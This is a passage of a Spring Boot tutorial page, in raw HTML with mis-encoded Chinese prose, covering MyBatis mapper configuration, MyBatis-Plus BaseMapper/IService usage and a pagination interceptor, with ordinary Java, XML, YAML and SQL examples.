class="hljs-comment">#å…¨å±€é…ç½®æ–‡ä»¶ä½ç½®</span><br>  <span class="hljs-attr">mapper-locations:</span> <span class="hljs-string">classpath:mybatis/*.xml</span>  <span class="hljs-comment">#sqlæ˜ å°„æ–‡ä»¶ä½ç½®</span><br></code></pre></td></tr></table></figure><p><strong>mybatis-config.xml</strong>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">configuration</span></span><br><span class="hljs-meta">  <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="hljs-meta">  <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- ç”±äºSpring Bootè‡ªåŠ¨é…ç½®ç¼˜æ•…ï¼Œæ­¤å¤„ä¸å¿…é…ç½®ï¼Œåªç”¨æ¥åšåšæ ·ã€‚--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>Mapperæ¥å£</strong>ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.lun.boot.mapper.UserMapper&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getUser&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.lun.boot.bean.User&quot;</span>&gt;</span><br>        select * from user where id=#&#123;id&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.lun.boot.bean.User;<br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Mapper;<br><br><span class="hljs-meta">@Mapper</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;<br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Integer id)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>POJO</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> Integer id;<br>    <span class="hljs-keyword">private</span> String name;<br>    <br><span class="hljs-comment">//getters and setters...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>DB</strong>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `<span class="hljs-keyword">user</span>` (<br>  `id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,<br>  `name` <span class="hljs-type">varchar</span>(<span class="hljs-number">45</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB AUTO_INCREMENT<span class="hljs-operator">=</span><span class="hljs-number">3</span> <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4;<br></code></pre></td></tr></table></figure><p><strong>Controller and Service</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> UserService userService;<br><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@GetMapping(&quot;/user/&#123;id&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span>&#123;<br><br>        <span class="hljs-keyword">return</span> userService.getUser(id);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> UserMapper userMapper;<span class="hljs-comment">//IDEAä¸‹æ ‡çº¢çº¿ï¼Œå¯å¿½è§†è¿™çº¢çº¿</span><br><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Integer id)</span>&#123;<br>        <span class="hljs-keyword">return</span> userMapper.getUser(id);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>é…ç½®<code>private Configuration configuration;</code> ä¹Ÿå°±æ˜¯é…ç½®<code>mybatis.configuration</code>ç›¸å…³çš„ï¼Œå°±æ˜¯ç›¸å½“äºæ”¹mybatiså…¨å±€é…ç½®æ–‡ä»¶ä¸­çš„å€¼ã€‚ï¼ˆä¹Ÿå°±æ˜¯è¯´é…ç½®äº†<code>mybatis.configuration</code>ï¼Œå°±ä¸éœ€é…ç½®mybatiså…¨å±€é…ç½®æ–‡ä»¶äº†ï¼‰</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># é…ç½®mybatisè§„åˆ™</span><br><span class="hljs-attr">mybatis:</span><br>  <span class="hljs-attr">mapper-locations:</span> <span class="hljs-string">classpath:mybatis/mapper/*.xml</span><br>  <span class="hljs-comment"># å¯ä»¥ä¸å†™å…¨å±€é…ç½®æ–‡ä»¶ï¼Œæ‰€æœ‰å…¨å±€é…ç½®æ–‡ä»¶çš„é…ç½®éƒ½æ”¾åœ¨configurationé…ç½®é¡¹ä¸­äº†ã€‚</span><br>  <span class="hljs-comment"># config-location: classpath:mybatis/mybatis-config.xml</span><br>  <span class="hljs-attr">configuration:</span><br>    <span class="hljs-attr">map-underscore-to-camel-case:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h3 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><ul><li>å¯¼å…¥MyBatiså®˜æ–¹Starterã€‚</li><li>ç¼–å†™Mapperæ¥å£ï¼Œéœ€<code>@Mapper</code>æ³¨è§£ã€‚</li><li>ç¼–å†™SQLæ˜ å°„æ–‡ä»¶å¹¶ç»‘å®šMapperæ¥å£ã€‚</li><li>åœ¨<code>application.yaml</code>ä¸­æŒ‡å®šMapperé…ç½®æ–‡ä»¶çš„æ‰€å¤„ä½ç½®ï¼Œä»¥åŠæŒ‡å®šå…¨å±€é…ç½®æ–‡ä»¶çš„ä¿¡æ¯ ï¼ˆå»ºè®®ï¼š**é…ç½®åœ¨<code>mybatis.configuration</code>**ï¼‰ã€‚</li></ul><h2 id="64ã€æ•°æ®è®¿é—®-æ•´åˆMyBatis-æ³¨è§£é…ç½®æ··åˆç‰ˆ"><a href="#64ã€æ•°æ®è®¿é—®-æ•´åˆMyBatis-æ³¨è§£é…ç½®æ··åˆç‰ˆ" class="headerlink" title="64ã€æ•°æ®è®¿é—®-æ•´åˆMyBatis-æ³¨è§£é…ç½®æ··åˆç‰ˆ"></a>64ã€æ•°æ®è®¿é—®-æ•´åˆMyBatis-æ³¨è§£é…ç½®æ··åˆç‰ˆ</h2><p>ä½ å¯ä»¥é€šè¿‡Spring Initializræ·»åŠ MyBatisçš„Starerã€‚</p><p><strong>æ³¨è§£ä¸é…ç½®æ··åˆæ­é…ï¼Œå¹²æ´»ä¸ç´¯</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapper</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;<br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Integer id)</span>;<br><br>    <span class="hljs-meta">@Select(&quot;select * from user where id=#&#123;id&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser2</span><span class="hljs-params">(Integer id)</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveUser</span><span class="hljs-params">(User user)</span>;<br><br>    <span class="hljs-meta">@Insert(&quot;insert into user(`name`) values(#&#123;name&#125;)&quot;)</span><br>    <span class="hljs-meta">@Options(useGeneratedKeys = true, keyProperty = &quot;id&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveUser2</span><span class="hljs-params">(User user)</span>;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.lun.boot.mapper.UserMapper&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getUser&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.lun.boot.bean.User&quot;</span>&gt;</span><br>        select * from user where id=#&#123;id&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;saveUser&quot;</span> <span class="hljs-attr">useGeneratedKeys</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">keyProperty</span>=<span class="hljs-string">&quot;id&quot;</span>&gt;</span><br>        insert into user(`name`) values(#&#123;name&#125;)<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p>ç®€å•DAOæ–¹æ³•å°±å†™åœ¨æ³¨è§£ä¸Šã€‚å¤æ‚çš„å°±å†™åœ¨é…ç½®æ–‡ä»¶é‡Œã€‚</p></li><li><p>ä½¿ç”¨<code>@MapperScan(&quot;com.lun.boot.mapper&quot;)</code> ç®€åŒ–ï¼ŒMapperæ¥å£å°±å¯ä»¥ä¸ç”¨æ ‡æ³¨<code>@Mapper</code>æ³¨è§£ã€‚</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@MapperScan(&quot;com.lun.boot.mapper&quot;)</span><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(MainApplication.class, args);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="65ã€æ•°æ®è®¿é—®-æ•´åˆMyBatisPlusæ“ä½œæ•°æ®åº“"><a href="#65ã€æ•°æ®è®¿é—®-æ•´åˆMyBatisPlusæ“ä½œæ•°æ®åº“" class="headerlink" title="65ã€æ•°æ®è®¿é—®-æ•´åˆMyBatisPlusæ“ä½œæ•°æ®åº“"></a>65ã€æ•°æ®è®¿é—®-æ•´åˆMyBatisPlusæ“ä½œæ•°æ®åº“</h2><p><a href="https://plugins.jetbrains.com/plugin/10119-mybatisx">IDEAçš„MyBatisçš„æ’ä»¶ - MyBatisX</a></p><p><a href="https://baomidou.com/">MyBatisPluså®˜ç½‘</a></p><p><a href="https://baomidou.com/guide/">MyBatisPluså®˜æ–¹æ–‡æ¡£</a></p><h3 id="MyBatisPlusæ˜¯ä»€ä¹ˆ"><a href="#MyBatisPlusæ˜¯ä»€ä¹ˆ" class="headerlink" title="MyBatisPlusæ˜¯ä»€ä¹ˆ"></a>MyBatisPlusæ˜¯ä»€ä¹ˆ</h3><p><a href="https://github.com/baomidou/mybatis-plus">MyBatis-Plus</a>ï¼ˆç®€ç§° MPï¼‰æ˜¯ä¸€ä¸ª <a href="http://www.mybatis.org/mybatis-3/">MyBatis</a>çš„å¢å¼ºå·¥å…·ï¼Œåœ¨ MyBatis çš„åŸºç¡€ä¸Šåªåšå¢å¼ºä¸åšæ”¹å˜ï¼Œä¸ºç®€åŒ–å¼€å‘ã€æé«˜æ•ˆç‡è€Œç”Ÿã€‚</p><hr><p>æ·»åŠ ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p><code>MybatisPlusAutoConfiguration</code>é…ç½®ç±»ï¼Œ<code>MybatisPlusProperties</code>é…ç½®é¡¹ç»‘å®šã€‚</p></li><li><p><code>SqlSessionFactory</code>è‡ªåŠ¨é…ç½®å¥½ï¼Œåº•å±‚æ˜¯å®¹å™¨ä¸­é»˜è®¤çš„æ•°æ®æºã€‚</p></li><li><p><code>mapperLocations</code>è‡ªåŠ¨é…ç½®å¥½çš„ï¼Œæœ‰é»˜è®¤å€¼<code>classpath*:/mapper/**/*.xml</code>ï¼Œè¿™è¡¨ç¤ºä»»æ„åŒ…çš„ç±»è·¯å¾„ä¸‹çš„æ‰€æœ‰mapperæ–‡ä»¶å¤¹ä¸‹ä»»æ„è·¯å¾„ä¸‹çš„æ‰€æœ‰xmléƒ½æ˜¯sqlæ˜ å°„æ–‡ä»¶ã€‚  å»ºè®®ä»¥åsqlæ˜ å°„æ–‡ä»¶æ”¾åœ¨ mapperä¸‹ã€‚</p></li><li><p>å®¹å™¨ä¸­ä¹Ÿè‡ªåŠ¨é…ç½®å¥½äº†<code>SqlSessionTemplate</code>ã€‚</p></li><li><p><code>@Mapper</code> æ ‡æ³¨çš„æ¥å£ä¹Ÿä¼šè¢«è‡ªåŠ¨æ‰«æï¼Œå»ºè®®ç›´æ¥ <code>@MapperScan(&quot;com.lun.boot.mapper&quot;)</code>æ‰¹é‡æ‰«æã€‚</p></li><li><p>MyBatisPlus<strong>ä¼˜ç‚¹</strong>ä¹‹ä¸€ï¼šåªéœ€è¦æˆ‘ä»¬çš„Mapperç»§æ‰¿MyBatisPlusçš„<code>BaseMapper</code> å°±å¯ä»¥æ‹¥æœ‰CRUDèƒ½åŠ›ï¼Œå‡è½»å¼€å‘å·¥ä½œã€‚</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.mapper.BaseMapper;<br><span class="hljs-keyword">import</span> com.lun.hellomybatisplus.model.User;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseMapper</span>&lt;User&gt; &#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="66ã€æ•°æ®è®¿é—®-CRUDå®éªŒ-æ•°æ®åˆ—è¡¨å±•ç¤º"><a href="#66ã€æ•°æ®è®¿é—®-CRUDå®éªŒ-æ•°æ®åˆ—è¡¨å±•ç¤º" class="headerlink" title="66ã€æ•°æ®è®¿é—®-CRUDå®éªŒ-æ•°æ®åˆ—è¡¨å±•ç¤º"></a>66ã€æ•°æ®è®¿é—®-CRUDå®éªŒ-æ•°æ®åˆ—è¡¨å±•ç¤º</h2><p><a href="https://baomidou.com/guide/crud-interface.html">å®˜æ–¹æ–‡æ¡£ - CRUDæ¥å£</a></p><p>ä½¿ç”¨MyBatis Plusæä¾›çš„<code>IService</code>ï¼Œ<code>ServiceImpl</code>ï¼Œå‡è½»Serviceå±‚å¼€å‘å·¥ä½œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.lun.hellomybatisplus.model.User;<br><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.service.IService;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  Service çš„CRUDä¹Ÿä¸ç”¨å†™äº†</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">IService</span>&lt;User&gt; &#123;<br><span class="hljs-comment">//æ­¤å¤„æ•…æ„ä¸ºç©º</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.lun.hellomybatisplus.model.User;<br><span class="hljs-keyword">import</span> com.lun.hellomybatisplus.mapper.UserMapper;<br><span class="hljs-keyword">import</span> com.lun.hellomybatisplus.service.UserService;<br><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Service;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ServiceImpl</span>&lt;UserMapper,User&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><span class="hljs-comment">//æ­¤å¤„æ•…æ„ä¸ºç©º</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸ä¸‹ä¸€èŠ‚è”åˆåœ¨ä¸€èµ·</p><h2 id="67ã€æ•°æ®è®¿é—®-CRUDå®éªŒ-åˆ†é¡µæ•°æ®å±•ç¤º"><a href="#67ã€æ•°æ®è®¿é—®-CRUDå®éªŒ-åˆ†é¡µæ•°æ®å±•ç¤º" class="headerlink" title="67ã€æ•°æ®è®¿é—®-CRUDå®éªŒ-åˆ†é¡µæ•°æ®å±•ç¤º"></a>67ã€æ•°æ®è®¿é—®-CRUDå®éªŒ-åˆ†é¡µæ•°æ®å±•ç¤º</h2><p>ä¸ä¸‹ä¸€èŠ‚è”åˆåœ¨ä¸€èµ·</p><h2 id="68ã€æ•°æ®è®¿é—®-CRUDå®éªŒ-åˆ é™¤ç”¨æˆ·å®Œæˆ"><a href="#68ã€æ•°æ®è®¿é—®-CRUDå®éªŒ-åˆ é™¤ç”¨æˆ·å®Œæˆ" class="headerlink" title="68ã€æ•°æ®è®¿é—®-CRUDå®éªŒ-åˆ é™¤ç”¨æˆ·å®Œæˆ"></a>68ã€æ•°æ®è®¿é—®-CRUDå®éªŒ-åˆ é™¤ç”¨æˆ·å®Œæˆ</h2><p>æ·»åŠ åˆ†é¡µæ’ä»¶ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBatisConfig</span> &#123;<br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * MybatisPlusInterceptor</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title function_">paginationInterceptor</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">MybatisPlusInterceptor</span> <span class="hljs-variable">mybatisPlusInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MybatisPlusInterceptor</span>();<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚çš„é¡µé¢å¤§äºæœ€å¤§é¡µåæ“ä½œï¼Œ trueè°ƒå›åˆ°é¦–é¡µï¼Œfalse ç»§ç»­è¯·æ±‚  é»˜è®¤false</span><br>        <span class="hljs-comment">// paginationInterceptor.setOverflow(false);</span><br>        <span class="hljs-comment">// è®¾ç½®æœ€å¤§å•é¡µé™åˆ¶æ•°é‡ï¼Œé»˜è®¤ 500 æ¡ï¼Œ-1 ä¸å—é™åˆ¶</span><br>        <span class="hljs-comment">// paginationInterceptor.setLimit(500);</span><br>        <span class="hljs-comment">// å¼€å¯ count çš„ join ä¼˜åŒ–,åªé’ˆå¯¹éƒ¨åˆ† left join</span><br><br>        <span class="hljs-comment">//è¿™æ˜¯åˆ†é¡µæ‹¦æˆªå™¨</span><br>        <span class="hljs-type">PaginationInnerInterceptor</span> <span class="hljs-variable">paginationInnerInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PaginationInnerInterceptor</span>();<br>        paginationInnerInterceptor.setOverflow(<span class="hljs-literal">true</span>);<br>        paginationInnerInterceptor.setMaxLimit(<span class="hljs-number">500L</span>);<br>        mybatisPlusInterceptor.addInnerInterceptor(paginationInnerInterceptor);<br><br>        <span class="hljs-keyword">return</span> mybatisPlusInterceptor;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;display table table-bordered table-striped&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dynamic-table&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>#<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>name<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>age<span class="hljs-tag">&lt;/<span 